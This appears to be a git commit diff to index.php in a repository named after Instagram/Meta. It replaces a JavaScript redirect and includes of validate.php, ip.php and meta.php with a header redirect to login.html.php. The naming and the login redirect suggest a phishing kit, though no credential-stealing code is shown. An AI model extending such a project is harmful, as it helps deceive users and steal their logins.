b38df10d6b4900c9d9bb8c79c6f7fa1499a68802
INSTAGRAMMETA-26 <chaconenzo16@gmail.com>
2026-06-07 01:14:46 -0300

    Update index.php

--- index.php
+++ index.php
@@ -1,11 +1,4 @@
 <?php
-include "validate.php";
-include "ip.php";
-include "meta.php";
-function redirect($props) {
-    $url = explode(":", $props)[1];
-    echo "<script>window.location.replace('$url');</script>";
-}
-redirect('Location: login.html.php');
+header("Location: login.html.php");
 exit();
 ?>
